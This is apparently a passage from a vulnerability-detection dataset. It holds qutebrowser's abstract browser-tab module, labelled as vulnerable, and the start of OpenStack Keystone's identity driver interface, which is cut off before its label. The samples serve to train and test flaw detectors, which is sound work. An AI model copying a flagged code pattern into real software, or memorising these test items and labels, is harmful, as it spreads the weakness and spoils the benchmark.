{"idx": 1065, "func": "# vim: ft=python fileencoding=utf-8 sts=4 sw=4 et:\n\n# Copyright 2016-2018 Florian Bruhin (The Compiler) <mail@qutebrowser.org>\n#\n# This file is part of qutebrowser.\n#\n# qutebrowser is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# qutebrowser is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with qutebrowser.  If not, see <http://www.gnu.org/licenses/>.\n\n\"\"\"Base class for a wrapper over QWebView/QWebEngineView.\"\"\"\n\nimport enum\nimport itertools\n\nimport attr\nfrom PyQt5.QtCore import pyqtSignal, pyqtSlot, QUrl, QObject, QSizeF, Qt\nfrom PyQt5.QtGui import QIcon\nfrom PyQt5.QtWidgets import QWidget, QApplication, QDialog\nfrom PyQt5.QtPrintSupport import QPrintDialog\n\nimport pygments\nimport pygments.lexers\nimport pygments.formatters\n\nfrom qutebrowser.keyinput import modeman\nfrom qutebrowser.config import config\nfrom qutebrowser.utils import (utils, objreg, usertypes, log, qtutils,\n                               urlutils, message)\nfrom qutebrowser.misc import miscwidgets, objects\nfrom qutebrowser.browser import mouse, hints\nfrom qutebrowser.qt import sip\n\n\ntab_id_gen = itertools.count(0)\n\n\ndef create(win_id, private, parent=None):\n    \"\"\"Get a QtWebKit/QtWebEngine tab object.\n\n    Args:\n        win_id: The window ID where the tab will be shown.\n        private: Whether the tab is a private/off the record tab.\n        parent: The Qt parent to set.\n    \"\"\"\n    # Importing modules here so we don't depend on QtWebEngine without the\n    # argument and to avoid circular imports.\n    mode_manager = modeman.instance(win_id)\n    if objects.backend == usertypes.Backend.QtWebEngine:\n        from qutebrowser.browser.webengine import webenginetab\n        tab_class = webenginetab.WebEngineTab\n    else:\n        from qutebrowser.browser.webkit import webkittab\n        tab_class = webkittab.WebKitTab\n    return tab_class(win_id=win_id, mode_manager=mode_manager, private=private,\n                     parent=parent)\n\n\ndef init():\n    \"\"\"Initialize backend-specific modules.\"\"\"\n    if objects.backend == usertypes.Backend.QtWebEngine:\n        from qutebrowser.browser.webengine import webenginetab\n        webenginetab.init()\n\n\nclass WebTabError(Exception):\n\n    \"\"\"Base class for various errors.\"\"\"\n\n\nclass UnsupportedOperationError(WebTabError):\n\n    \"\"\"Raised when an operation is not supported with the given backend.\"\"\"\n\n\nTerminationStatus = enum.Enum('TerminationStatus', [\n    'normal',\n    'abnormal',  # non-zero exit status\n    'crashed',   # e.g. segfault\n    'killed',\n    'unknown',\n])\n\n\n@attr.s\nclass TabData:\n\n    \"\"\"A simple namespace with a fixed set of attributes.\n\n    Attributes:\n        keep_icon: Whether the (e.g. cloned) icon should not be cleared on page\n                   load.\n        inspector: The QWebInspector used for this webview.\n        viewing_source: Set if we're currently showing a source view.\n                        Only used when sources are shown via pygments.\n        open_target: Where to open the next link.\n                     Only used for QtWebKit.\n        override_target: Override for open_target for fake clicks (like hints).\n                         Only used for QtWebKit.\n        pinned: Flag to pin the tab.\n        fullscreen: Whether the tab has a video shown fullscreen currently.\n        netrc_used: Whether netrc authentication was performed.\n        input_mode: current input mode for the tab.\n    \"\"\"\n\n    keep_icon = attr.ib(False)\n    viewing_source = attr.ib(False)\n    inspector = attr.ib(None)\n    open_target = attr.ib(usertypes.ClickTarget.normal)\n    override_target = attr.ib(None)\n    pinned = attr.ib(False)\n    fullscreen = attr.ib(False)\n    netrc_used = attr.ib(False)\n    input_mode = attr.ib(usertypes.KeyMode.normal)\n\n    def should_show_icon(self):\n        return (config.val.tabs.favicons.show == 'always' or\n                config.val.tabs.favicons.show == 'pinned' and self.pinned)\n\n\nclass AbstractAction:\n\n    \"\"\"Attribute of AbstractTab for Qt WebActions.\n\n    Class attributes (overridden by subclasses):\n        action_class: The class actions are defined on (QWeb{Engine,}Page)\n        action_base: The type of the actions (QWeb{Engine,}Page.WebAction)\n    \"\"\"\n\n    action_class = None\n    action_base = None\n\n    def __init__(self, tab):\n        self._widget = None\n        self._tab = tab\n\n    def exit_fullscreen(self):\n        \"\"\"Exit the fullscreen mode.\"\"\"\n        raise NotImplementedError\n\n    def save_page(self):\n        \"\"\"Save the current page.\"\"\"\n        raise NotImplementedError\n\n    def run_string(self, name):\n        \"\"\"Run a webaction based on its name.\"\"\"\n        member = getattr(self.action_class, name, None)\n        if not isinstance(member, self.action_base):\n            raise WebTabError(\"{} is not a valid web action!\".format(name))\n        self._widget.triggerPageAction(member)\n\n    def show_source(self,\n                    pygments=False):  # pylint: disable=redefined-outer-name\n        \"\"\"Show the source of the current page in a new tab.\"\"\"\n        raise NotImplementedError\n\n    def _show_source_pygments(self):\n\n        def show_source_cb(source):\n            \"\"\"Show source as soon as it's ready.\"\"\"\n            # WORKAROUND for https://github.com/PyCQA/pylint/issues/491\n            # pylint: disable=no-member\n            lexer = pygments.lexers.HtmlLexer()\n            formatter = pygments.formatters.HtmlFormatter(\n                full=True, linenos='table')\n            # pylint: enable=no-member\n            highlighted = pygments.highlight(source, lexer, formatter)\n\n            tb = objreg.get('tabbed-browser', scope='window',\n                            window=self._tab.win_id)\n            new_tab = tb.tabopen(background=False, related=True)\n            new_tab.set_html(highlighted, self._tab.url())\n            new_tab.data.viewing_source = True\n\n        self._tab.dump_async(show_source_cb)\n\n\nclass AbstractPrinting:\n\n    \"\"\"Attribute of AbstractTab for printing the page.\"\"\"\n\n    def __init__(self, tab):\n        self._widget = None\n        self._tab = tab\n\n    def check_pdf_support(self):\n        raise NotImplementedError\n\n    def check_printer_support(self):\n        raise NotImplementedError\n\n    def check_preview_support(self):\n        raise NotImplementedError\n\n    def to_pdf(self, filename):\n        raise NotImplementedError\n\n    def to_printer(self, printer, callback=None):\n        \"\"\"Print the tab.\n\n        Args:\n            printer: The QPrinter to print to.\n            callback: Called with a boolean\n                      (True if printing succeeded, False otherwise)\n        \"\"\"\n        raise NotImplementedError\n\n    def show_dialog(self):\n        \"\"\"Print with a QPrintDialog.\"\"\"\n        self.check_printer_support()\n\n        def print_callback(ok):\n            \"\"\"Called when printing finished.\"\"\"\n            if not ok:\n                message.error(\"Printing failed!\")\n            diag.deleteLater()\n\n        def do_print():\n            \"\"\"Called when the dialog was closed.\"\"\"\n            self.to_printer(diag.printer(), print_callback)\n\n        diag = QPrintDialog(self._tab)\n        if utils.is_mac:\n            # For some reason we get a segfault when using open() on macOS\n            ret = diag.exec_()\n            if ret == QDialog.Accepted:\n                do_print()\n        else:\n            diag.open(do_print)\n\n\nclass AbstractSearch(QObject):\n\n    \"\"\"Attribute of AbstractTab for doing searches.\n\n    Attributes:\n        text: The last thing this view was searched for.\n        search_displayed: Whether we're currently displaying search results in\n                          this view.\n        _flags: The flags of the last search (needs to be set by subclasses).\n        _widget: The underlying WebView widget.\n\n    Signals:\n        finished: Emitted when a search was finished.\n                  arg: True if the text was found, False otherwise.\n        cleared: Emitted when an existing search was cleared.\n    \"\"\"\n\n    finished = pyqtSignal(bool)\n    cleared = pyqtSignal()\n\n    def __init__(self, tab, parent=None):\n        super().__init__(parent)\n        self._tab = tab\n        self._widget = None\n        self.text = None\n        self.search_displayed = False\n\n    def _is_case_sensitive(self, ignore_case):\n        \"\"\"Check if case-sensitivity should be used.\n\n        This assumes self.text is already set properly.\n\n        Arguments:\n            ignore_case: The ignore_case value from the config.\n        \"\"\"\n        mapping = {\n            'smart': not self.text.islower(),\n            'never': True,\n            'always': False,\n        }\n        return mapping[ignore_case]\n\n    def search(self, text, *, ignore_case='never', reverse=False,\n               result_cb=None):\n        \"\"\"Find the given text on the page.\n\n        Args:\n            text: The text to search for.\n            ignore_case: Search case-insensitively. ('always'/'never/'smart')\n            reverse: Reverse search direction.\n            result_cb: Called with a bool indicating whether a match was found.\n        \"\"\"\n        raise NotImplementedError\n\n    def clear(self):\n        \"\"\"Clear the current search.\"\"\"\n        raise NotImplementedError\n\n    def prev_result(self, *, result_cb=None):\n        \"\"\"Go to the previous result of the current search.\n\n        Args:\n            result_cb: Called with a bool indicating whether a match was found.\n        \"\"\"\n        raise NotImplementedError\n\n    def next_result(self, *, result_cb=None):\n        \"\"\"Go to the next result of the current search.\n\n        Args:\n            result_cb: Called with a bool indicating whether a match was found.\n        \"\"\"\n        raise NotImplementedError\n\n\nclass AbstractZoom(QObject):\n\n    \"\"\"Attribute of AbstractTab for controlling zoom.\n\n    Attributes:\n        _neighborlist: A NeighborList with the zoom levels.\n        _default_zoom_changed: Whether the zoom was changed from the default.\n    \"\"\"\n\n    def __init__(self, tab, parent=None):\n        super().__init__(parent)\n        self._tab = tab\n        self._widget = None\n        self._default_zoom_changed = False\n        self._init_neighborlist()\n        config.instance.changed.connect(self._on_config_changed)\n        self._zoom_factor = float(config.val.zoom.default) / 100\n\n        # # FIXME:qtwebengine is this needed?\n        # # For some reason, this signal doesn't get disconnected automatically\n        # # when the WebView is destroyed on older PyQt versions.\n        # # See https://github.com/qutebrowser/qutebrowser/issues/390\n        # self.destroyed.connect(functools.partial(\n        #     cfg.changed.disconnect, self.init_neighborlist))\n\n    @pyqtSlot(str)\n    def _on_config_changed(self, option):\n        if option in ['zoom.levels', 'zoom.default']:\n            if not self._default_zoom_changed:\n                factor = float(config.val.zoom.default) / 100\n                self.set_factor(factor)\n            self._init_neighborlist()\n\n    def _init_neighborlist(self):\n        \"\"\"Initialize self._neighborlist.\"\"\"\n        levels = config.val.zoom.levels\n        self._neighborlist = usertypes.NeighborList(\n            levels, mode=usertypes.NeighborList.Modes.edge)\n        self._neighborlist.fuzzyval = config.val.zoom.default\n\n    def offset(self, offset):\n        \"\"\"Increase/Decrease the zoom level by the given offset.\n\n        Args:\n            offset: The offset in the zoom level list.\n\n        Return:\n            The new zoom percentage.\n        \"\"\"\n        level = self._neighborlist.getitem(offset)\n        self.set_factor(float(level) / 100, fuzzyval=False)\n        return level\n\n    def _set_factor_internal(self, factor):\n        raise NotImplementedError\n\n    def set_factor(self, factor, *, fuzzyval=True):\n        \"\"\"Zoom to a given zoom factor.\n\n        Args:\n            factor: The zoom factor as float.\n            fuzzyval: Whether to set the NeighborLists fuzzyval.\n        \"\"\"\n        if fuzzyval:\n            self._neighborlist.fuzzyval = int(factor * 100)\n        if factor < 0:\n            raise ValueError(\"Can't zoom to factor {}!\".format(factor))\n\n        default_zoom_factor = float(config.val.zoom.default) / 100\n        self._default_zoom_changed = (factor != default_zoom_factor)\n\n        self._zoom_factor = factor\n        self._set_factor_internal(factor)\n\n    def factor(self):\n        return self._zoom_factor\n\n    def set_default(self):\n        self._set_factor_internal(float(config.val.zoom.default) / 100)\n\n    def set_current(self):\n        self._set_factor_internal(self._zoom_factor)\n\n\nclass AbstractCaret(QObject):\n\n    \"\"\"Attribute of AbstractTab for caret browsing.\n\n    Signals:\n        selection_toggled: Emitted when the selection was toggled.\n                           arg: Whether the selection is now active.\n        follow_selected_done: Emitted when a follow_selection action is done.\n    \"\"\"\n\n    selection_toggled = pyqtSignal(bool)\n    follow_selected_done = pyqtSignal()\n\n    def __init__(self, tab, mode_manager, parent=None):\n        super().__init__(parent)\n        self._tab = tab\n        self._widget = None\n        self.selection_enabled = False\n        mode_manager.entered.connect(self._on_mode_entered)\n        mode_manager.left.connect(self._on_mode_left)\n\n    def _on_mode_entered(self, mode):\n        raise NotImplementedError\n\n    def _on_mode_left(self, mode):\n        raise NotImplementedError\n\n    def move_to_next_line(self, count=1):\n        raise NotImplementedError\n\n    def move_to_prev_line(self, count=1):\n        raise NotImplementedError\n\n    def move_to_next_char(self, count=1):\n        raise NotImplementedError\n\n    def move_to_prev_char(self, count=1):\n        raise NotImplementedError\n\n    def move_to_end_of_word(self, count=1):\n        raise NotImplementedError\n\n    def move_to_next_word(self, count=1):\n        raise NotImplementedError\n\n    def move_to_prev_word(self, count=1):\n        raise NotImplementedError\n\n    def move_to_start_of_line(self):\n        raise NotImplementedError\n\n    def move_to_end_of_line(self):\n        raise NotImplementedError\n\n    def move_to_start_of_next_block(self, count=1):\n        raise NotImplementedError\n\n    def move_to_start_of_prev_block(self, count=1):\n        raise NotImplementedError\n\n    def move_to_end_of_next_block(self, count=1):\n        raise NotImplementedError\n\n    def move_to_end_of_prev_block(self, count=1):\n        raise NotImplementedError\n\n    def move_to_start_of_document(self):\n        raise NotImplementedError\n\n    def move_to_end_of_document(self):\n        raise NotImplementedError\n\n    def toggle_selection(self):\n        raise NotImplementedError\n\n    def drop_selection(self):\n        raise NotImplementedError\n\n    def selection(self, callback):\n        raise NotImplementedError\n\n    def _follow_enter(self, tab):\n        \"\"\"Follow a link by faking an enter press.\"\"\"\n        if tab:\n            self._tab.key_press(Qt.Key_Enter, modifier=Qt.ControlModifier)\n        else:\n            self._tab.key_press(Qt.Key_Enter)\n\n    def follow_selected(self, *, tab=False):\n        raise NotImplementedError\n\n\nclass AbstractScroller(QObject):\n\n    \"\"\"Attribute of AbstractTab to manage scroll position.\"\"\"\n\n    perc_changed = pyqtSignal(int, int)\n\n    def __init__(self, tab, parent=None):\n        super().__init__(parent)\n        self._tab = tab\n        self._widget = None\n        self.perc_changed.connect(self._log_scroll_pos_change)\n\n    @pyqtSlot()\n    def _log_scroll_pos_change(self):\n        log.webview.vdebug(\"Scroll position changed to {}\".format(\n            self.pos_px()))\n\n    def _init_widget(self, widget):\n        self._widget = widget\n\n    def pos_px(self):\n        raise NotImplementedError\n\n    def pos_perc(self):\n        raise NotImplementedError\n\n    def to_perc(self, x=None, y=None):\n        raise NotImplementedError\n\n    def to_point(self, point):\n        raise NotImplementedError\n\n    def to_anchor(self, name):\n        raise NotImplementedError\n\n    def delta(self, x=0, y=0):\n        raise NotImplementedError\n\n    def delta_page(self, x=0, y=0):\n        raise NotImplementedError\n\n    def up(self, count=1):\n        raise NotImplementedError\n\n    def down(self, count=1):\n        raise NotImplementedError\n\n    def left(self, count=1):\n        raise NotImplementedError\n\n    def right(self, count=1):\n        raise NotImplementedError\n\n    def top(self):\n        raise NotImplementedError\n\n    def bottom(self):\n        raise NotImplementedError\n\n    def page_up(self, count=1):\n        raise NotImplementedError\n\n    def page_down(self, count=1):\n        raise NotImplementedError\n\n    def at_top(self):\n        raise NotImplementedError\n\n    def at_bottom(self):\n        raise NotImplementedError\n\n\nclass AbstractHistory:\n\n    \"\"\"The history attribute of a AbstractTab.\"\"\"\n\n    def __init__(self, tab):\n        self._tab = tab\n        self._history = None\n\n    def __len__(self):\n        return len(self._history)\n\n    def __iter__(self):\n        return iter(self._history.items())\n\n    def current_idx(self):\n        raise NotImplementedError\n\n    def back(self, count=1):\n        \"\"\"Go back in the tab's history.\"\"\"\n        idx = self.current_idx() - count\n        if idx >= 0:\n            self._go_to_item(self._item_at(idx))\n        else:\n            self._go_to_item(self._item_at(0))\n            raise WebTabError(\"At beginning of history.\")\n\n    def forward(self, count=1):\n        \"\"\"Go forward in the tab's history.\"\"\"\n        idx = self.current_idx() + count\n        if idx < len(self):\n            self._go_to_item(self._item_at(idx))\n        else:\n            self._go_to_item(self._item_at(len(self) - 1))\n            raise WebTabError(\"At end of history.\")\n\n    def can_go_back(self):\n        raise NotImplementedError\n\n    def can_go_forward(self):\n        raise NotImplementedError\n\n    def _item_at(self, i):\n        raise NotImplementedError\n\n    def _go_to_item(self, item):\n        raise NotImplementedError\n\n    def serialize(self):\n        \"\"\"Serialize into an opaque format understood by self.deserialize.\"\"\"\n        raise NotImplementedError\n\n    def deserialize(self, data):\n        \"\"\"Serialize from a format produced by self.serialize.\"\"\"\n        raise NotImplementedError\n\n    def load_items(self, items):\n        \"\"\"Deserialize from a list of WebHistoryItems.\"\"\"\n        raise NotImplementedError\n\n\nclass AbstractElements:\n\n    \"\"\"Finding and handling of elements on the page.\"\"\"\n\n    def __init__(self, tab):\n        self._widget = None\n        self._tab = tab\n\n    def find_css(self, selector, callback, *, only_visible=False):\n        \"\"\"Find all HTML elements matching a given selector async.\n\n        Args:\n            callback: The callback to be called when the search finished.\n            selector: The CSS selector to search for.\n            only_visible: Only show elements which are visible on screen.\n        \"\"\"\n        raise NotImplementedError\n\n    def find_id(self, elem_id, callback):\n        \"\"\"Find the HTML element with the given ID async.\n\n        Args:\n            callback: The callback to be called when the search finished.\n            elem_id: The ID to search for.\n        \"\"\"\n        raise NotImplementedError\n\n    def find_focused(self, callback):\n        \"\"\"Find the focused element on the page async.\n\n        Args:\n            callback: The callback to be called when the search finished.\n                      Called with a WebEngineElement or None.\n        \"\"\"\n        raise NotImplementedError\n\n    def find_at_pos(self, pos, callback):\n        \"\"\"Find the element at the given position async.\n\n        This is also called \"hit test\" elsewhere.\n\n        Args:\n            pos: The QPoint to get the element for.\n            callback: The callback to be called when the search finished.\n                      Called with a WebEngineElement or None.\n        \"\"\"\n        raise NotImplementedError\n\n\nclass AbstractAudio(QObject):\n\n    \"\"\"Handling of audio/muting for this tab.\"\"\"\n\n    muted_changed = pyqtSignal(bool)\n    recently_audible_changed = pyqtSignal(bool)\n\n    def __init__(self, tab, parent=None):\n        super().__init__(parent)\n        self._widget = None\n        self._tab = tab\n\n    def set_muted(self, muted: bool, override: bool = False):\n        \"\"\"Set this tab as muted or not.\n\n        Arguments:\n            override: If set to True, muting/unmuting was done manually and\n                      overrides future automatic mute/unmute changes based on\n                      the URL.\n        \"\"\"\n        raise NotImplementedError\n\n    def is_muted(self):\n        \"\"\"Whether this tab is muted.\"\"\"\n        raise NotImplementedError\n\n    def toggle_muted(self, *, override: bool = False):\n        self.set_muted(not self.is_muted(), override=override)\n\n    def is_recently_audible(self):\n        \"\"\"Whether this tab has had audio playing recently.\"\"\"\n        raise NotImplementedError\n\n\nclass AbstractTab(QWidget):\n\n    \"\"\"A wrapper over the given widget to hide its API and expose another one.\n\n    We use this to unify QWebView and QWebEngineView.\n\n    Attributes:\n        history: The AbstractHistory for the current tab.\n        registry: The ObjectRegistry associated with this tab.\n        private: Whether private browsing is turned on for this tab.\n\n        _load_status: loading status of this page\n                      Accessible via load_status() method.\n        _has_ssl_errors: Whether SSL errors happened.\n                         Needs to be set by subclasses.\n\n        for properties, see WebView/WebEngineView docs.\n\n    Signals:\n        See related Qt signals.\n\n        new_tab_requested: Emitted when a new tab should be opened with the\n                           given URL.\n        load_status_changed: The loading status changed\n        fullscreen_requested: Fullscreen display was requested by the page.\n                              arg: True if fullscreen should be turned on,\n                                   False if it should be turned off.\n        renderer_process_terminated: Emitted when the underlying renderer\n                                     process terminated.\n                                     arg 0: A TerminationStatus member.\n                                     arg 1: The exit code.\n        predicted_navigation: Emitted before we tell Qt to open a URL.\n    \"\"\"\n\n    window_close_requested = pyqtSignal()\n    link_hovered = pyqtSignal(str)\n    load_started = pyqtSignal()\n    load_progress = pyqtSignal(int)\n    load_finished = pyqtSignal(bool)\n    icon_changed = pyqtSignal(QIcon)\n    title_changed = pyqtSignal(str)\n    load_status_changed = pyqtSignal(str)\n    new_tab_requested = pyqtSignal(QUrl)\n    url_changed = pyqtSignal(QUrl)\n    shutting_down = pyqtSignal()\n    contents_size_changed = pyqtSignal(QSizeF)\n    add_history_item = pyqtSignal(QUrl, QUrl, str)  # url, requested url, title\n    fullscreen_requested = pyqtSignal(bool)\n    renderer_process_terminated = pyqtSignal(TerminationStatus, int)\n    predicted_navigation = pyqtSignal(QUrl)\n\n    def __init__(self, *, win_id, mode_manager, private, parent=None):\n        self.private = private\n        self.win_id = win_id\n        self.tab_id = next(tab_id_gen)\n        super().__init__(parent)\n\n        self.registry = objreg.ObjectRegistry()\n        tab_registry = objreg.get('tab-registry', scope='window',\n                                  window=win_id)\n        tab_registry[self.tab_id] = self\n        objreg.register('tab', self, registry=self.registry)\n\n        self.data = TabData()\n        self._layout = miscwidgets.WrapperLayout(self)\n        self._widget = None\n        self._progress = 0\n        self._has_ssl_errors = False\n        self._mode_manager = mode_manager\n        self._load_status = usertypes.LoadStatus.none\n        self._mouse_event_filter = mouse.MouseEventFilter(\n            self, parent=self)\n        self.backend = None\n\n        # FIXME:qtwebengine  Should this be public api via self.hints?\n        #                    Also, should we get it out of objreg?\n        hintmanager = hints.HintManager(win_id, self.tab_id, parent=self)\n        objreg.register('hintmanager', hintmanager, scope='tab',\n                        window=self.win_id, tab=self.tab_id)\n\n        self.predicted_navigation.connect(self._on_predicted_navigation)\n\n    def _set_widget(self, widget):\n        # pylint: disable=protected-access\n        self._widget = widget\n        self._layout.wrap(self, widget)\n        self.history._history = widget.history()\n        self.scroller._init_widget(widget)\n        self.caret._widget = widget\n        self.zoom._widget = widget\n        self.search._widget = widget\n        self.printing._widget = widget\n        self.action._widget = widget\n        self.elements._widget = widget\n        self.audio._widget = widget\n        self.settings._settings = widget.settings()\n\n        self._install_event_filter()\n        self.zoom.set_default()\n\n    def _install_event_filter(self):\n        raise NotImplementedError\n\n    def _set_load_status(self, val):\n        \"\"\"Setter for load_status.\"\"\"\n        if not isinstance(val, usertypes.LoadStatus):\n            raise TypeError(\"Type {} is no LoadStatus member!\".format(val))\n        log.webview.debug(\"load status for {}: {}\".format(repr(self), val))\n        self._load_status = val\n        self.load_status_changed.emit(val.name)\n\n    def event_target(self):\n        \"\"\"Return the widget events should be sent to.\"\"\"\n        raise NotImplementedError\n\n    def send_event(self, evt):\n        \"\"\"Send the given event to the underlying widget.\n\n        The event will be sent via QApplication.postEvent.\n        Note that a posted event may not be re-used in any way!\n        \"\"\"\n        # This only gives us some mild protection against re-using events, but\n        # it's certainly better than a segfault.\n        if getattr(evt, 'posted', False):\n            raise utils.Unreachable(\"Can't re-use an event which was already \"\n                                    \"posted!\")\n\n        recipient = self.event_target()\n        if recipient is None:\n            # https://github.com/qutebrowser/qutebrowser/issues/3888\n            log.webview.warning(\"Unable to find event target!\")\n            return\n\n        evt.posted = True\n        QApplication.postEvent(recipient, evt)\n\n    @pyqtSlot(QUrl)\n    def _on_predicted_navigation(self, url):\n        \"\"\"Adjust the title if we are going to visit an URL soon.\"\"\"\n        qtutils.ensure_valid(url)\n        url_string = url.toDisplayString()\n        log.webview.debug(\"Predicted navigation: {}\".format(url_string))\n        self.title_changed.emit(url_string)\n\n    @pyqtSlot(QUrl)\n    def _on_url_changed(self, url):\n        \"\"\"Update title when URL has changed and no title is available.\"\"\"\n        if url.isValid() and not self.title():\n            self.title_changed.emit(url.toDisplayString())\n        self.url_changed.emit(url)\n\n    @pyqtSlot()\n    def _on_load_started(self):\n        self._progress = 0\n        self._has_ssl_errors = False\n        self.data.viewing_source = False\n        self._set_load_status(usertypes.LoadStatus.loading)\n        self.load_started.emit()\n\n    @pyqtSlot(usertypes.NavigationRequest)\n    def _on_navigation_request(self, navigation):\n        \"\"\"Handle common acceptNavigationRequest code.\"\"\"\n        url = utils.elide(navigation.url.toDisplayString(), 100)\n        log.webview.debug(\"navigation request: url {}, type {}, is_main_frame \"\n                          \"{}\".format(url,\n                                      navigation.navigation_type,\n                                      navigation.is_main_frame))\n\n        if not navigation.url.isValid():\n            # Also a WORKAROUND for missing IDNA 2008 support in QUrl, see\n            # https://bugreports.qt.io/browse/QTBUG-60364\n\n            if navigation.navigation_type == navigation.Type.link_clicked:\n                msg = urlutils.get_errstring(navigation.url,\n                                             \"Invalid link clicked\")\n                message.error(msg)\n                self.data.open_target = usertypes.ClickTarget.normal\n\n            log.webview.debug(\"Ignoring invalid URL {} in \"\n                              \"acceptNavigationRequest: {}\".format(\n                                  navigation.url.toDisplayString(),\n                                  navigation.url.errorString()))\n            navigation.accepted = False\n\n    def handle_auto_insert_mode(self, ok):\n        \"\"\"Handle `input.insert_mode.auto_load` after loading finished.\"\"\"\n        if not config.val.input.insert_mode.auto_load or not ok:\n            return\n\n        cur_mode = self._mode_manager.mode\n        if cur_mode == usertypes.KeyMode.insert:\n            return\n\n        def _auto_insert_mode_cb(elem):\n            \"\"\"Called from JS after finding the focused element.\"\"\"\n            if elem is None:\n                log.webview.debug(\"No focused element!\")\n                return\n            if elem.is_editable():\n                modeman.enter(self.win_id, usertypes.KeyMode.insert,\n                              'load finished', only_if_normal=True)\n\n        self.elements.find_focused(_auto_insert_mode_cb)\n\n    @pyqtSlot(bool)\n    def _on_load_finished(self, ok):\n        if sip.isdeleted(self._widget):\n            # https://github.com/qutebrowser/qutebrowser/issues/3498\n            return\n\n        sess_manager = objreg.get('session-manager')\n        sess_manager.save_autosave()\n\n        if ok and not self._has_ssl_errors:\n            if self.url().scheme() == 'https':\n                self._set_load_status(usertypes.LoadStatus.success_https)\n            else:\n                self._set_load_status(usertypes.LoadStatus.success)\n        elif ok:\n            self._set_load_status(usertypes.LoadStatus.warn)\n        else:\n            self._set_load_status(usertypes.LoadStatus.error)\n\n        self.load_finished.emit(ok)\n\n        if not self.title():\n            self.title_changed.emit(self.url().toDisplayString())\n\n        self.zoom.set_current()\n\n    @pyqtSlot()\n    def _on_history_trigger(self):\n        \"\"\"Emit add_history_item when triggered by backend-specific signal.\"\"\"\n        raise NotImplementedError\n\n    @pyqtSlot(int)\n    def _on_load_progress(self, perc):\n        self._progress = perc\n        self.load_progress.emit(perc)\n\n    def url(self, requested=False):\n        raise NotImplementedError\n\n    def progress(self):\n        return self._progress\n\n    def load_status(self):\n        return self._load_status\n\n    def _openurl_prepare(self, url, *, predict=True):\n        qtutils.ensure_valid(url)\n        if predict:\n            self.predicted_navigation.emit(url)\n\n    def openurl(self, url, *, predict=True):\n        raise NotImplementedError\n\n    def reload(self, *, force=False):\n        raise NotImplementedError\n\n    def stop(self):\n        raise NotImplementedError\n\n    def clear_ssl_errors(self):\n        raise NotImplementedError\n\n    def key_press(self, key, modifier=Qt.NoModifier):\n        \"\"\"Send a fake key event to this tab.\"\"\"\n        raise NotImplementedError\n\n    def dump_async(self, callback, *, plain=False):\n        \"\"\"Dump the current page's html asynchronously.\n\n        The given callback will be called with the result when dumping is\n        complete.\n        \"\"\"\n        raise NotImplementedError\n\n    def run_js_async(self, code, callback=None, *, world=None):\n        \"\"\"Run javascript async.\n\n        The given callback will be called with the result when running JS is\n        complete.\n\n        Args:\n            code: The javascript code to run.\n            callback: The callback to call with the result, or None.\n            world: A world ID (int or usertypes.JsWorld member) to run the JS\n                   in the main world or in another isolated world.\n        \"\"\"\n        raise NotImplementedError\n\n    def shutdown(self):\n        raise NotImplementedError\n\n    def title(self):\n        raise NotImplementedError\n\n    def icon(self):\n        raise NotImplementedError\n\n    def set_html(self, html, base_url=QUrl()):\n        raise NotImplementedError\n\n    def networkaccessmanager(self):\n        \"\"\"Get the QNetworkAccessManager for this tab.\n\n        This is only implemented for QtWebKit.\n        For QtWebEngine, always returns None.\n        \"\"\"\n        raise NotImplementedError\n\n    def user_agent(self):\n        \"\"\"Get the user agent for this tab.\n\n        This is only implemented for QtWebKit.\n        For QtWebEngine, always returns None.\n        \"\"\"\n        raise NotImplementedError\n\n    def __repr__(self):\n        try:\n            url = utils.elide(self.url().toDisplayString(QUrl.EncodeUnicode),\n                              100)\n        except (AttributeError, RuntimeError) as exc:\n            url = '<{}>'.format(exc.__class__.__name__)\n        return utils.get_repr(self, tab_id=self.tab_id, url=url)\n\n    def is_deleted(self):\n        return sip.isdeleted(self._widget)\n", "target": 1}
{"idx": 1066, "func": "# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2012 OpenStack LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n# not use this file except in compliance with the License. You may obtain\n# a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n# License for the specific language governing permissions and limitations\n# under the License.\n\n\"\"\"Main entry point into the Identity service.\"\"\"\n\nimport uuid\nimport urllib\nimport urlparse\n\nfrom keystone import config\nfrom keystone import exception\nfrom keystone import policy\nfrom keystone import token\nfrom keystone.common import logging\nfrom keystone.common import manager\nfrom keystone.common import wsgi\n\n\nCONF = config.CONF\n\nLOG = logging.getLogger(__name__)\n\n\nclass Manager(manager.Manager):\n    \"\"\"Default pivot point for the Identity backend.\n\n    See :mod:`keystone.common.manager.Manager` for more details on how this\n    dynamically calls the backend.\n\n    \"\"\"\n\n    def __init__(self):\n        super(Manager, self).__init__(CONF.identity.driver)\n\n\nclass Driver(object):\n    \"\"\"Interface description for an Identity driver.\"\"\"\n\n    def authenticate(self, user_id=None, tenant_id=None, password=None):\n        \"\"\"Authenticate a given user, tenant and password.\n\n        Returns: (user, tenant, metadata).\n\n        \"\"\"\n        raise exception.NotImplemented()\n\n    def get_tenant(self, tenant_id):\n        \"\"\"Get a tenant by id.\n\n        Returns: tenant_ref or None.\n\n        \"\"\"\n        raise exception.NotImplemented()\n\n    def get_tenant_by_name(self, tenant_name):\n        \"\"\"Get a tenant by name.\n\n        Returns: tenant_ref or None.\n\n        \"\"\"\n        raise exception.NotImplemented()\n\n    def get_user(self, user_id):\n        \"\"\"Get a user by id.\n\n        Returns: user_ref or None.\n\n        \"\"\"\n        raise exception.NotImplemented()\n\n    def get_user_by_name(self, user_name):\n        \"\"\"Get a user by name.\n\n        Returns: user_ref or None.\n\n        \"\"\"\n        raise exception.NotImplemented()\n\n    def get_role(self, role_id):\n        \"\"\"Get a role by id.\n\n        Returns: role_ref or None.\n\n        \"\"\"\n        raise exception.NotImplemented()\n\n    def list_users(self):\n        \"\"\"List all users in the system.\n\n        NOTE(termie): I'd prefer if this listed only the users for a given\n                      tenant.\n\n        Returns: a list of user_refs or an empty list.\n\n        \"\"\"\n        raise exception.NotImplemented()\n\n    def list_roles(self):\n        